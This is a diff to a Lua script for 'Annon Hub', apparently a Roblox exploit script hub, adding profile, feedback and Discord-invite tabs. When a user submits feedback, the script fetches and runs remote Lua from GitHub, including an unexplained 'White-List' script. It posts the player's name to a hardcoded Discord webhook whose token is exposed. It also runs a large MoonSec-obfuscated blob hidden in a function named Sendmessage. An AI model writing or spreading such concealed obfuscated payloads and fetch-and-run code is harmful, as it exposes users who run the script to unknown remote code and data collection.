@@ -36,9 +36,97 @@ end
 _G.Key = "Des"
 _G.KeyInput = "string"
 
+_G.FeedBackString = "String"
 
 ------------- Need help? ------------
 _G.FeedBackString = "string"
+
+
+
+
+
+
+--[[
+███████╗██╗░░░██╗███╗░░██╗░█████╗░████████╗██╗░█████╗░███╗░░██╗░██████╗
+██╔════╝██║░░░██║████╗░██║██╔══██╗╚══██╔══╝██║██╔══██╗████╗░██║██╔════╝
+█████╗░░██║░░░██║██╔██╗██║██║░░╚═╝░░░██║░░░██║██║░░██║██╔██╗██║╚█████╗░
+██╔══╝░░██║░░░██║██║╚████║██║░░██╗░░░██║░░░██║██║░░██║██║╚████║░╚═══██╗
+██║░░░░░╚██████╔╝██║░╚███║╚█████╔╝░░░██║░░░██║╚█████╔╝██║░╚███║██████╔╝
+╚═╝░░░░░░╚═════╝░╚═╝░░╚══╝░╚════╝░░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░╚══╝╚═════╝░]]
+
+
+
+
+
+------ Send Message To web Hook -------
+function SendMessageToWebhook()
+	Sendmessage()
+	end
+
+---------------------- Discord invite from my discord server ----------------------
+function Sunrise()
+	local Module = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Discord%20Inviter/Source.lua"))()
+
+	Module.Prompt({ invite = "https://discord.gg/xxdstbR4", name = "" }) -- name is optional
+	
+	Module.Join("")
+end
+
+
+
+
+
+
+
+
+
+
+--[[
+██████╗░██████╗░░█████╗░███████╗██╗██╗░░░░░███████╗
+██╔══██╗██╔══██╗██╔══██╗██╔════╝██║██║░░░░░██╔════╝
+██████╔╝██████╔╝██║░░██║█████╗░░██║██║░░░░░█████╗░░
+██╔═══╝░██╔══██╗██║░░██║██╔══╝░░██║██║░░░░░██╔══╝░░
+██║░░░░░██║░░██║╚█████╔╝██║░░░░░██║███████╗███████╗
+╚═╝░░░░░╚═╝░░╚═╝░╚════╝░╚═╝░░░░░╚═╝╚══════╝╚══════╝]]
+
+local Profile = Window:MakeTab({
+	Name = "Profile",
+	Icon = "rbxassetid://9411304331",
+	PremiumOnly = false
+})
+
+
+
+
+------- Profile ----------
+local Section = Profile:AddSection({
+	Name = "Profile"
+})
+Profile:AddParagraph("Profile","Annon Hub is the best hub ofc ;) made by Annon#7747 UwW.")
+
+
+------ Information --------
+local Section = Profile:AddSection({
+	Name = "Information"
+})
+Profile:AddParagraph("Information","Currently in Alpha, mostly messing around with the UI, not many people will have this script for now, mainly used by me.")
+
+------------------------------ whats Annon Hub for
+local Section = Profile:AddSection({
+	Name = "Whats Annon Hub for"
+})
+--------- What its for --------
+Profile:AddParagraph("What's Annon Hub for?","Annon Hub is a script hub full of scripts/HUBS.")
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -78,6 +166,61 @@ Key:AddTextbox({
 		loadingScreen()
 		MakeAnnon()
 	end	  
+})
+
+
+
+
+
+
+
+
+local Help = Window:MakeTab({
+	Name = "Help/Feedback",
+	Icon = "rbxassetid://4370314188",
+	PremiumOnly = false
+})
+
+
+local Section = Help:AddSection({
+	Name = "Help/Feedback"
+})
+
+Help:AddParagraph("FeedBack/Help","You can send feedback or support, suggestions, and questions, we will try to respond/act on your freebacks as soon as possible")
+Help:AddTextbox({
+	Name = "Feedback/Help",
+	Default = "Feedback/Help Here",
+	TextDisappear = true,
+	Callback = function(Value)
+		_G.FeedBackString = Value
+		local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+		SendMessageToWebhook()
+function _G.SendWebHook(url, message)newBody = {["content"] = tostring(message)}; SynWebHook = {Url = url,Body = game.HttpService:JSONEncode(newBody),Method = "POST",Headers = {["content-type"] = "application/json"}};syn.request(SynWebHook)end;
+_G.SendWebHook("https://discord.com/api/webhooks/1001910271163502653/FIdlpMjvcdRAWtNNNnrncPE1z-0sHVSse_lsZkrOR3YcU_hnWGgApl2FYh1XB5SMJ7iy", "***"..Player.Name.."*** has sent feedback: ***".._G.FeedBackString.."***")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/YourMomClapped/White-List/main/.lua", true))()
+	end
+})
+
+
+
+
+
+
+
+
+
+
+
+---------------------------------- Discord Invite ----------------------------------
+local Section = Help:AddSection({
+	Name = "Discord Invite"
+})
+
+Help:AddButton({
+	Name = "Dicord invite",
+	Callback = function()
+      		Sunrise()
+  	end    
 })
 
 
@@ -184,6 +327,15 @@ end
 
 
 
+function Sendmessage()
+	_, Protected_by_MoonSecV2, Discord = 'discord.gg/gQEH2uZxUk'
+
+
+,nil,nil;(function() _msec=(function(e,o,l)local W=o["㒛㒚㒙㒥㒗㒢㒤㒟㒡㒞㒙㒤㒙㒜"];local H=l[e[(1445-0x30f)]][e["㒚㒟㒠㒥㒞㒘㒣㒤㒜㒡㒠"]];local i=(368/0x5c)/(((4920/0x8)-321)/147)local x=((1984/(4402/0x47))-0x1e)-(-23+0x18)local y=l[e[(333-0xce)]][e["㒚㒦㒝㒤㒟㒞㒢㒛㒦㒛㒢㒞㒙㒥㒗㒟"]];local g=(((0x25-59)+97)-0x4a)+(62-0x3c)local J=l[e[(0x4bf-661)]][e["㒘㒥㒜㒘㒗㒤㒥㒤㒗㒣㒙㒗㒚㒦"]]local n=(-54+0x38)-(0x37+(-0x17+((-626572/0x7c)/163)))local v=((3810/((0x3c28/200)-47))-0x7b)local N=((0x593-((132099+-0x21)/174))/0xa7)local S=((0x17a-(0x202-(397+-0x7f)))-130)local s=((0xd5d4/(18354/(279-0xa5)))/0x55)local B=(0x3a-((0x18976e/(297-0xaa))/0xeb))local C=(70+((27-(0xca-163))+-0x36))local h=((-17+(-0x3f2a/(0x8458/220)))+125)local c=(130+((-571500/(71+-0x15))/0x5a))local k=((-130-((-122+0xa7)-78))+0x64)local t=((((-0x48+292410)/3)/218)/0x95)local M=((148+(-0x1c+(76-0x4c)))/0x28)local D=((0x124-((0x395-511)-249))/0x2d)local U=((0x21f-(326+((-0x40+20)+0x1)))/0x82)local w=((-90+((176189-0x15857)/0xc9))/174)local b=(0x7a-((0x1b7+(-0x20a0/96))-232))local f=(0x21-(-87+((0x49+-111)+0x9c)))local O=(35+((-10376-(-0x10ab7d/213))/0x9f))local _=(0x68-(0x129-(((0x12945-38106)/0x95)+-0x3c)))local Q=e[(-0x54+1482)];local K=l[e[(376-(0xd5fc/220))]][e["㒣㒞㒥㒞㒠㒝㒥㒥㒜㒥㒜㒥㒡㒜㒦㒛㒥"]];local G=l[(function(e)return type(e):sub(1,1)..'\101\116'end)('㒛㒤㒢㒠㒡㒛㒛㒤')..'\109\101'..('\116\97'or'㒥㒛㒚㒙㒢㒝㒚㒟')..e[(1183-0x275)]];local u=l[e[(0x4540/32)]][e["㒢㒠㒜㒝㒤㒚㒣㒥㒘㒤㒚"]];local L=(20/0xa)-(-0x27+(0x1ec0/(510-0x13e)))local m=((-37-(83+-0x2e))+76)-(-70+0x48)local Y=l[e[(203+-0x4c)]][e["㒢㒛㒞㒟㒣㒙㒗㒘㒢㒟㒡"]];local d=function(e,l)return e..l end local p=(-109+0x71)*((6762/(192+-0x36))+-0x2d)local V=l[e["㒙㒚㒙㒘㒞㒜㒦㒣㒞"]];local r=(0x1a2/209)*(((-79+0x1b)+1716)/13)local A=(0x816-1046)*(-51+((0x200-288)-0xab))local R=(0x10a8/(0x329c/((753-0x1a2)-0xb1)))local j=(66/(5313/(-0x1b+188)))*(0x20-30)local P=l[e["㒦㒢㒜㒜㒙㒠㒚㒣㒛㒤㒝㒠㒛㒥㒣㒝"]]or l[e[(11080/0x14)]][e["㒦㒢㒜㒜㒙㒠㒚㒣㒛㒤㒝㒠㒛㒥㒣㒝"]];local a=(((29942/0x16)-0x2d4)-381)local e=l[e["㒞㒞㒟㒞㒣㒙㒤㒞㒥㒘㒙"]];local J=(function(a)local r,o=3,0x10 local l={j={},v={}}local d=-n local e=o+x while true do l[a:sub(e,(function()e=r+e return e-x end)())]=(function()d=d+n return d end)()if d==(p-n)then d=""o=L break end end local d=#a while e<d+x do l.v[o]=a:sub(e,(function()e=r+e return e-x end)())o=o+n if o%i==L then o=m u(l.j,(Y((l[l.v[m]]*p)+l[l.v[n]])))end end return J(l.j)end)("..:::MoonSec::..㒗㒘㒙㒚㒛㒜㒝㒞㒟㒠㒡㒢㒣㒤㒥㒦㒤㒗㒞㒛㒘㒤㒣㒝㒞㒗㒘㒟㒣㒘㒝㒡㒘㒚㒢㒣㒝㒜㒗㒥㒢㒢㒝㒗㒗㒠㒢㒙㒝㒡㒘㒗㒡㒤㒜㒝㒦㒦㒣㒣㒚㒢㒟㒣㒦㒥㒜㒝㒢㒦㒙㒤㒠㒜㒦㒥㒝㒜㒣㒞㒘㒦㒜㒠㒛㒠㒥㒝㒟㒦㒚㒟㒗㒚㒝㒝㒤㒡㒙㒥㒠㒦㒗㒚㒝㒤㒤㒚㒙㒜㒠㒞㒗㒙㒝㒝㒗㒚㒞㒢㒘㒦㒣㒟㒞㒘㒚㒠㒠㒦㒗㒘㒞㒠㒤㒗㒥㒢㒘㒡㒢㒠㒝㒙㒗㒢㒤㒟㒛㒞㒡㒜㒗㒘㒝㒦㒤㒞㒛㒗㒡㒞㒗㒠㒝㒘㒜㒥㒦㒞㒡㒗㒛㒠㒗㒛㒣㒣㒛㒛㒥㒤㒠㒝㒛㒚㒥㒟㒠㒘㒚㒡㒥㒠㒠㒚㒚㒜㒤㒥㒟㒞㒚㒣㒤㒠㒟㒚㒙㒢㒤㒜㒞㒤㒙㒡㒥㒥㒞㒟㒙㒘㒣㒡㒞㒦㒘㒣㒣㒝㒝㒥㒙㒠㒦㒘㒝㒠㒘㒙㒢㒢㒝㒜㒗㒤㒢㒝㒜㒦㒗㒥㒢㒟㒜㒡㒗㒚㒡㒣㒝㒘㒦㒥㒡㒟㒜㒗㒦㒡㒡㒙㒛㒦㒘㒚㒠㒤㒛㒝㒥㒦㒡㒛㒛㒘㒥㒢㒠㒚㒛㒥㒘㒝㒟㒥㒚㒞㒥㒗㒟㒢㒚㒙㒤㒢㒟㒛㒚㒚㒗㒙㒞㒦㒙㒟㒤㒘㒟㒛㒙㒚㒣㒤㒞㒜㒘㒥㒣㒞㒞㒛㒚㒟㒣㒙㒝㒢㒘㒛㒣㒞㒝㒝㒘㒗㒢㒟㒝㒜㒙㒠㒢㒚㒜㒣㒗㒜㒢㒡㒜㒞㒗㒘㒡㒠㒝㒛㒙㒣㒡㒛㒛㒤㒦㒝㒡㒙㒛㒟㒦㒘㒠㒡㒝㒚㒗㒟㒠㒜㒚㒥㒥㒞㒠㒗㒚㒠㒥㒛㒟㒢㒚㒛㒥㒠㒟㒝㒚㒗㒤㒟㒟㒙㒙㒡㒤㒚㒞㒣㒙㒜㒦㒤㒞㒞㒙㒗㒣㒠㒞㒛㒘㒢㒣㒝㒝㒤㒘㒝㒤㒗㒝㒟㒘㒘㒢㒡㒝㒚㒗㒣㒢㒜㒜㒥㒗㒞㒣㒞㒜㒠㒗㒙㒡㒢㒜㒜㒦㒤㒡㒝㒛㒦㒦㒟㒡㒙㒛㒡㒦㒚㒠㒣㒝㒥㒦㒚㒠㒞㒛㒗㒥㒠㒢㒤㒘㒜㒞㒟㒥㒟㒛㒤㒥㒞㒟㒟㒚㒘㒤㒡㒟㒚㒚㒞㒤㒜㒞㒦㒙㒞㒤㒗㒞㒠㒙㒙㒣㒢㒟㒝㒛㒥㒣㒝㒞㒘㒘㒟㒣㒙㒝㒡㒘㒚㒢㒣㒝㒢㒙㒠㒢㒞㒝㒚㒗㒠㒢㒙㒜㒢㒗㒜㒡㒤㒜㒟㒦㒦㒡㒟㒜㒡㒦㒡㒡㒚㒛㒣㒦㒝㒠㒥㒛㒞㒦㒗㒠㒠㒛㒢㒥㒢㒠㒛㒚㒤㒥㒝㒟㒦㒚㒟㒥㒘㒟㒡㒝㒗㒤㒣㒟㒞㒙㒥㒤㒠㒟㒗㒙㒡㒤㒙㒞㒢㒜㒟㒣㒤㒞㒞㒘㒦㒣㒡㒞㒘㒘㒡㒣㒚㒝㒣㒙㒣㒢㒥㒝㒞㒘㒗㒢㒡㒝㒙㒗㒢㒢㒛㒜㒥㒗㒞㒡㒦㒜㒟㒗㒘㒡㒡㒜㒚㒦㒣㒡㒜㒛㒥㒦㒞㒡㒗㒛㒠㒦㒠㒠㒢㒛㒛㒥㒤㒠㒝㒟㒥㒥㒟㒠㒘㒚㒡㒥㒛㒟㒣㒚㒜㒤㒥㒟㒞㒚㒗㒤㒠㒟㒙㒙㒢㒤㒛㒞㒤㒙㒝㒣㒦㒞㒟㒙㒘㒣㒡㒞㒚㒘㒣㒣㒜㒝㒥㒘㒞㒣㒗㒝㒠㒘㒙㒢㒢㒝㒛㒗㒤㒢㒠㒜㒦㒗㒟㒢㒘㒜㒡㒗㒚㒡㒣㒜㒜㒦㒥㒡㒞㒜㒗㒦㒠㒡㒙㒛㒢㒦㒛㒠㒤㒛㒝㒥㒦㒠㒡㒛㒘㒥㒡㒠㒚㒚㒣㒥㒜㒟㒥㒚㒞㒥㒗㒟㒡㒚㒙㒤㒢㒟㒛㒙㒤㒤㒟㒞㒦㒙㒟㒤㒘㒛㒡㒙㒚㒣㒣㒞㒜㒘㒥㒣㒞㒞㒗㒘㒠㒣㒙㒞㒡㒘㒠㒢㒤㒝㒝㒗㒦㒥㒚㒚㒢㒠㒥㒗㒥㒞㒚㒙㒙㒡㒥㒜㒞㒗㒗㒢㒢㒞㒜㒦㒢㒡㒝㒛㒤㒦㒞㒠㒦㒛㒟㒦㒘㒡㒣㒝㒝㒥㒣㒠㒟㒚㒥㒥㒟㒠㒗㒚㒠㒥㒙㒠㒤㒝㒜㒤㒤㒟㒡㒙㒦㒤㒡㒟㒘㒙㒡㒤㒚㒟㒙㒛㒗㒣㒥㒞㒣㒙㒗㒣㒠㒞㒙㒘㒣㒣㒛㒞㒘㒘㒝㒢㒦㒞㒘㒘㒘㒢㒡㒝㒚㒗㒥㒢㒜㒜㒥㒗㒞㒢㒗㒝㒙㒗㒙㒡㒢㒜㒛㒦㒤㒡㒝㒛㒦㒦㒟㒡㒘㒜㒚㒦㒚㒠㒣㒛㒜㒦㒘㒠㒞㒛㒗㒥㒠㒠㒙㒛㒛㒥㒛㒟㒤㒚㒝㒥㒗㒟㒟㒚㒘㒤㒡㒟㒚㒜㒠㒤㒜㒟㒙㒙㒞㒤㒙㒞㒠㒙㒚㒣㒢㒞㒡㒙㒜㒣㒝㒝㒦㒘㒟㒤㒡㒝㒡㒘㒛㒢㒣㒝㒝㒗㒥㒢㒢㒞㒦㒗㒠㒢㒙㒜㒢㒘㒤㒡㒤㒜㒞㒦㒦㒡㒥㒜㒠㒦㒡㒡㒚㒛㒣㒗㒥㒠㒥㒛㒟㒦㒗㒠㒡㒛㒙㒥㒦㒢㒚㒚㒤㒥㒝㒟㒦㒜㒘㒥㒘㒟㒢㒚㒚㒥㒙㒣㒘㒙㒥㒤㒟㒟㒗㒚㒠㒤㒙㒞㒣㒙㒛㒣㒤㒞㒝㒙㒚㒥㒞㒞㒘㒘㒡㒣㒚㒞㒣㒘㒜㒢㒦㒝㒞㒘㒛㒤㒟㒝㒙㒗㒢㒢㒛㒞㒝㒗㒝㒢㒗㒜㒟㒗㒘㒢㒟㒜㒚㒗㒗㒡㒜㒜㒗㒦㒞㒡㒚㒛㒠㒦㒙㒡㒠㒛㒛㒦㒙㒠㒝㒛㒙㒥㒟㒠㒚㒚㒡㒥㒠㒠㒛㒚㒜㒥㒙㒟㒞㒛㒠㒤㒠㒟㒚㒙㒢㒤㒠㒞㒤㒙㒡㒥㒥㒞㒟㒙㒘㒣㒡㒟㒣㒘㒣㒣㒝㒝㒥㒘㒞㒣㒥㒝㒠㒘㒝㒢㒢㒝㒝㒗㒤㒢㒠㒜㒦㒗㒟㒢㒦㒜㒡㒗㒟㒡㒣㒜㒟㒦㒥㒡㒠㒜㒗㒦㒦㒡㒡㒛㒢㒦㒟㒠㒤㒜㒦㒥㒦㒠㒠㒛㒘㒥㒦㒠㒚㒛㒗㒗㒛㒟㒥㒚㒞㒥㒗㒡㒙㒚㒙㒤㒣㒟㒛㒚㒘㒦㒜㒞㒦㒙㒟㒤㒘㒠㒛㒙㒚㒣㒤㒞㒜㒘㒥㒗㒞㒞㒗㒘㒤㒣㒙㒝㒢㒘㒛㒢㒤㒝㒝㒗㒦㒣㒚㒝㒘㒗㒥㒢㒚㒜㒤㒗㒜㒡㒥㒜㒞㒗㒗㒤㒤㒜㒙㒦㒦㒡㒛㒛㒦㒦㒝㒠㒦㒛㒟㒦㒘㒢㒘㒛㒚㒥㒣㒠㒜㒚㒦㒥㒞㒠㒗㒚㒠㒥㒛㒟㒢㒚㒛㒤㒤㒟㒝㒙㒦㒤㒟㒟㒘㒙㒡㒤㒛㒞㒣㒙㒜㒣㒥㒞㒞㒚㒞㒣㒠㒞㒙㒘㒢㒣㒜㒝㒤㒘㒝㒢㒦㒝㒟㒘㒘㒢㒡㒝㒚㒗㒣㒢㒝㒜㒥㒗㒞㒢㒗㒛㒜㒗㒞㒡㒢㒜㒛㒦㒤㒤㒘㒚㒟㒠㒛㒦㒥㒝㒠㒦㒞㒠㒣㒛㒜㒥㒥㒡㒠㒞㒘㒥㒠㒠㒙㒚㒢㒥㒜㒟㒤㒚㒝㒤㒦㒟㒟㒚㒤㒤㒡㒟㒛㒙㒣㒤㒜㒞㒥㒙㒞㒤㒗㒞㒠㒛㒦㒣㒢㒞㒛㒘㒤㒣㒟㒝㒦㒘㒠㒣㒘㒝㒡㒙㒡㒢㒣㒝㒜㒗㒥㒢㒟㒝㒗㒗㒠㒢㒙㒜㒢㒗㒛㒡㒤㒜㒝㒦㒦㒢㒗㒜㒘㒦㒡㒡㒚㒞㒜㒦㒢㒠㒥㒛㒞㒦㒗㒣㒞㒙㒤㒠㒗㒥㒣㒜㒝㒢㒛㒝㒥㒚㒣㒥㒘㒟㒡㒚㒚㒦㒡㒝㒛㒣㒙㒚㒟㒝㒡㒙㒠㒤㒙㒞㒢㒙㒛㒣㒤㒞㒝㒟㒦㒗㒟㒟㒢㒘㒡㒣㒚㒝㒣㒘㒜㒢㒥㒝㒞㒗㒗㒦㒟㒤㒡㒗㒢㒢㒛㒜㒤㒗㒝㒙㒝㒜㒢㒗㒘㒡㒡㒜㒚㒙㒡㒠㒘㒥㒚㒦㒗㒡㒛㒛㒠㒦㒙㒠㒢㒝㒘㒤㒤㒚㒤㒠㒚㒜㒙㒠㒤㒚㒡㒥㒚㒟㒣㒝㒛㒠㒟㒗㒛㒟㒜㒦㒞㒝㒗㒠㒞㒗㒞㒝㒘㒣㒙㒙㒦㒠㒢㒛㒚㒣㒡㒞㒚㒘㒣㒤㒞㒠㒦㒘㒞㒣㒚㒝㒠㒘㒡㒢㒢㒝㒛㒗㒤㒢㒝㒢㒘㒗㒟㒢㒛㒜㒡㒗㒝㒡㒣㒜㒝㒦㒥㒡㒤㒜㒞㒦㒠㒡㒜㒛㒢㒦㒠㒠㒤㒛㒞㒥㒦㒠㒠㒛㒘㒥㒥㒢㒙㒚㒣㒥㒜㒟㒥㒚㒣㒥㒗㒟㒡㒚㒙㒤㒦㒡㒚㒙㒤㒤㒝㒞㒦㒚㒗㒤㒘㒞㒢㒙㒚㒤㒥㒡㒝㒘㒥㒣㒡㒞㒗㒙㒘㒣㒙㒝㒢㒘㒛㒢㒤㒢㒟㒗㒦㒢㒢㒝㒘㒗㒤㒢㒚㒜㒤㒗㒜㒡㒥㒟㒢㒗㒗㒡㒣㒜㒙㒦㒤㒡㒛㒛㒤㒦㒝㒢㒘㒝㒢㒦㒘㒠㒤㒛㒚㒦㒗㒠㒜㒚㒥㒥㒞㒡㒙㒞㒥㒥㒙㒟㒦㒚㒛㒥㒙㒟㒝㒙㒦㒤㒟㒠㒚㒙㒡㒤㒚㒟㒘㒙㒜㒤㒙㒞㒞㒙㒗㒣㒠㒞㒙㒘㒢㒣㒛㒞㒚㒘㒝㒢㒦㒝㒟㒘㒘㒢㒡㒞㒜㒗㒣㒢㒜㒝㒜㒗㒞㒢㒛㒜㒠㒗㒙㒡㒢㒜㒟㒦㒤㒡㒝㒜㒛㒦㒟㒢㒦㒛㒡㒦㒛㒠㒣㒛㒜㒘㒛㒠㒞㒛㒠㒥㒠㒠㒝㒚㒢㒥㒛㒟㒤㒛㒟㒗㒛㒟㒟㒚㒢㒤㒡㒟㒛㒙㒣㒤㒜㒞㒥㒛㒞㒤㒗㒞㒠㒙㒣㒣㒢㒞㒥㒘㒤㒣㒟㒝㒦㒚㒟㒣㒘㒝㒡㒘㒥㒢㒣㒝㒜㒗㒥㒢㒤㒝㒗㒗㒠㒢㒙㒜㒢㒘㒘㒡㒤㒜㒥㒦㒦㒡㒟㒜㒘㒦㒡㒡㒚㒛㒣㒗㒚㒠㒥㒛㒦㒦㒗㒠㒠㒛㒙㒥㒢㒠㒛㒚㒤㒦㒘㒟㒦㒛㒝㒥㒘㒟㒣㒚㒚㒦㒣㒟㒜㒙㒥㒥㒙㒟㒗㒚㒛㒤㒙㒟㒙㒙㒛㒣㒤㒞㒝㒘㒦㒤㒚㒞㒘㒘㒣㒣㒚㒝㒥㒘㒜㒢㒥㒝㒞㒘㒗㒣㒛㒝㒙㒘㒝㒢㒛㒝㒗㒗㒝㒣㒦㒜㒟㒗㒘㒢㒜㒜㒚㒗㒞㒡㒜㒜㒘㒦㒞㒡㒗㒛㒠㒦㒙㒡㒜㒛㒛㒥㒦㒠㒝㒛㒘㒥㒟㒠㒘㒚㒡㒥㒚㒠㒗㒚㒜㒥㒞㒟㒞㒚㒡㒤㒠㒟㒙㒙㒢㒤㒛㒟㒝㒙㒝㒤㒙㒞㒟㒙㒚㒣㒡㒠㒚㒘㒣㒣㒜㒞㒘㒘㒞㒣㒠㒝㒠㒘㒜㒢㒢㒝㒟㒜㒛㒢㒝㒝㒛㒗㒟㒢㒦㒜㒡㒗㒛㒡㒣㒝㒞㒙㒦㒡㒞㒜㒜㒦㒠㒡㒡㒛㒢㒦㒛㒠㒤㒛㒝㒚㒘㒠㒟㒛㒝㒥㒡㒠㒛㒚㒣㒥㒠㒟㒥㒚㒞㒘㒛㒟㒠㒚㒝㒤㒢㒟㒝㒙㒤㒤㒝㒞㒦㒙㒟㒥㒟㒞㒡㒙㒚㒣㒣㒞㒝㒘㒥㒣㒞㒞㒗㒘㒣㒗㒦㒝㒢㒘㒛㒢㒤㒣㒚㒘㒚㒢㒟㒝㒘㒗㒡㒤㒜㒚㒛㒡㒜㒗㒙㒙㒡㒗㒝㒡㒠㒜㒙㒦㒢㒗㒣㒠㒠㒙㒝㒡㒗㒚㒜㒢㒦㒜㒗㒛㒚㒥㒣㒠㒜㒚㒥㒥㒞㒘㒗㒞㒤㒙㒙㒠㒟㒚㒛㒤㒤㒟㒝㒙㒦㒤㒟㒗㒘㒞㒝㒘㒚㒝㒟㒙㒦㒣㒥㒞㒞㒙㒗㒣㒢㒛㒥㒣㒙㒗㒝㒞㒤㒥㒦㒜㒟㒢㒗㒗㒦㒞㒝㒟㒣㒘㒙㒢㒜㒜㒥㒗㒞㒤㒦㒦㒜㒣㒢㒤㒥㒦㒢㒢㒛㒘㒤㒝㒜㒦㒟㒡㒘㒛㒡㒦㒥㒟㒜㒥㒞㒜㒘㒡㒞㒗㒡㒟㒗㒤㒝㒚㒡㒜㒢㒘㒞㒝㒥㒤㒥㒚㒞㒜㒛㒥㒝㒝㒤㒤㒙㒚㒝㒟㒗㒦㒞㒜㒡㒣㒡㒙㒚㒣㒢㒞㒛㒘㒤㒚㒝㒡㒜㒘㒢㒣㒘㒝㒡㒘㒚㒤㒢㒜㒘㒡㒥㒥㒤㒝㒚㒗㒠㒢㒙㒜㒢㒘㒛㒠㒝㒦㒜㒥㒢㒢㒙㒜㒘㒦㒡㒡㒚㒞㒚㒤㒢㒚㒙㒠㒡㒗㒥㒞㒛㒤㒞㒚㒚㒠㒤㒦㒢㒤㒤㒟㒦㒚㒟㒥㒘㒟㒡㒚㒚㒤㒣㒢㒜㒝㒥㒝㒟㒟㒝㒙㒠㒤㒙㒞㒢㒥㒗㒙㒛㒡㒝㒞㒡㒦㒟㒡㒤㒙㒡㒚㒜㒝㒣㒘㒜㒢㒥㒣㒝㒘㒚㒝㒗㒡㒙㒗㒤㒛㒣㒡㒝㒢㒢㒥㒥㒛㒗㒤㒢㒢㒦㒛㒢㒠㒦㒤㒝㒗㒠㒜㒢㒦㒝㒤㒡㒝㒗㒤㒠㒙㒣㒞㒙㒣㒜㒘㒗㒝㒛㒞㒙㒡㒜㒦㒞㒠㒙㒞㒝㒦㒣㒞㒜㒣㒟㒗㒥㒝㒘㒡㒣㒗㒗㒦㒛㒝㒛㒤㒤㒘㒦㒝㒤㒟㒦㒣㒙㒘㒛㒡㒦㒠㒚㒙㒟㒟㒟㒤㒞㒙㒝㒞㒠㒣㒜㒤㒥㒘㒘㒝㒚㒦㒥㒥㒙㒞㒞㒤㒞㒙㒝㒞㒜㒣㒟㒘㒛㒘㒚㒟㒥㒥㒥㒛㒞㒟㒣㒡㒥㒥㒘㒚㒚㒣㒥㒢㒙㒚㒟㒡㒢㒗㒚㒜㒜㒝㒚㒠㒝㒥㒟㒟㒚㒝㒞㒗㒛㒝㒗㒢㒛㒦㒛㒛㒤㒟㒦㒤㒤㒦㒦㒚㒙㒟㒛㒘㒦㒗㒚㒟㒦㒥㒝㒚㒗㒝㒞㒠㒡㒥㒣㒟㒞㒝㒢㒦㒤㒝㒤㒡㒦㒣㒦㒗㒙㒜㒛㒥㒦㒙㒠㒞㒝㒣㒚㒚㒢㒜㒠㒦㒢㒡㒛㒛㒤㒜㒟㒗㒜㒡㒜㒛㒣㒤㒥㒟㒟㒙㒦㒚㒛㒢㒞㒥㒞㒠㒗㒚㒠㒛㒠㒥㒤㒟㒜㒘㒠㒢㒛㒘㒚㒡㒗㒚㒟㒗㒜㒡㒙㒛㒛㒣㒣㒞㒗㒗㒢㒠㒜㒦㒞㒣㒛㒝㒟㒦㒥㒜㒟㒙㒙㒣㒠㒜㒡㒢㒟㒠㒟㒘㒥㒢㒚㒜㒘㒦㒗㒟㒟㒘㒣㒢㒣㒘㒗㒡㒡㒛㒘㒤㒠㒞㒙㒘㒙㒡㒙㒚㒠㒤㒚㒞㒗㒗㒙㒠㒡㒚㒞㒣㒣㒝㒝㒦㒠㒠㒚㒙㒦㒣㒝㒜㒣㒦㒗㒠㒦㒚㒡㒥㒤㒟㒤㒙㒠㒠㒥㒜㒚㒦㒞㒞㒣㒘㒜㒠㒢㒙㒙㒤㒗㒟㒜㒦㒞㒟㒦㒙㒞㒤㒦㒞㒢㒗㒦㒠㒣㒙㒘㒡㒥㒚㒙㒘㒚㒜㒥㒦㒠㒤㒛㒛㒘㒥㒞㒞㒣㒚㒛㒢㒥㒜㒗㒦㒜㒠㒛㒘㒚㒢㒣㒜㒢㒤㒗㒝㒢㒥㒛㒡㒙㒛㒛㒣㒥㒞㒗㒘㒘㒡㒦㒚㒗㒢㒟㒞㒗㒥㒙㒡㒠㒚㒤㒠㒢㒛㒞㒦㒙㒠㒠㒦㒡㒢㒠㒚㒢㒣㒝㒞㒣㒗㒥㒡㒚㒙㒟㒦㒙㒠㒡㒛㒟㒟㒙㒘㒜㒢㒥㒝㒞㒞㒞㒘㒣㒢㒜㒛㒡㒡㒤㒚㒢㒤㒛㒡㒞㒛㒞㒠㒤㒝㒡㒘㒙㒡㒛㒗㒙㒤㒗㒞㒜㒗㒣㒝㒞㒚㒢㒤㒤㒞㒙㒗㒡㒦㒚㒛㒙㒥㒟㒠㒘㒚㒡㒘㒘㒞㒣㒤㒝㒝㒦㒟㒤㒚㒗㒤㒠㒟㒙㒚㒢㒣㒘㒥㒣㒥㒥㒞㒚㒜㒠㒢㒙㒤㒜㒞㒚㒘㒣㒣㒜㒞㒘㒗㒙㒝㒞㒣㒟㒘㒗㒟㒞㒦㒠㒝㒙㒢㒡㒘㒠㒟㒗㒞㒝㒜㒦㒗㒚㒡㒣㒜㒜㒙㒡㒠㒚㒥㒟㒜㒡㒣㒝㒝㒟㒦㒟㒠㒤㒛㒝㒥㒦㒦㒠㒞㒟㒗㒡㒟㒡㒦㒛㒥㒣㒟㒥㒚㒞㒥㒗㒡㒢㒗㒥㒟㒙㒤㒠㒚㒤㒡㒢㒘㒟㒘㒛㒤㒢㒞㒡㒙㒚㒣㒣㒟㒦㒦㒛㒝㒤㒣㒛㒙㒞㒠㒥㒗㒗㒜㒟㒢㒤㒙㒥㒡㒗㒣㒙㒝㒘㒗㒡㒢㒚㒟㒠㒥㒘㒛㒟㒡㒦㒘㒡㒞㒥㒣㒚㒚㒢㒡㒣㒗㒠㒘㒙㒡㒜㒛㒟㒦㒘㒠㒡㒥㒦㒢㒘㒟㒘㒢㒤㒙㒟㒚㒠㒥㒛㒥㒥㒟㒢㒚㒛㒤㒤㒢㒜㒥㒠㒜㒜㒤㒝㒛㒟㒢㒘㒥㒟㒜㒟㒢㒙㒘㒚㒟㒗㒥㒣㒗㒚㒙㒝㒣㒛㒝㒤㒘㒝㒣㒝㒛㒥㒡㒞㒗㒡㒞㒡㒣㒚㒛㒛㒠㒥㒘㒢㒝㒣㒤㒥㒝㒡㒡㒢㒜㒛㒦㒤㒡㒝㒛㒦㒞㒟㒥㒞㒟㒡㒦㒜㒡㒙㒛㒜㒥㒥㒠㒞㒙㒛㒡㒦㒤㒞㒜㒗㒡㒤㒢㒝㒠㒚㒥㒜㒟㒟㒚㒘㒤㒡㒙㒘㒣㒟㒞㒙㒥㒢㒛㒘㒜㒢㒗㒟㒙㒙㒣㒢㒞㒛㒘㒤㒣㒝㒝㒦㒛㒠㒗㒘㒦㒣㒘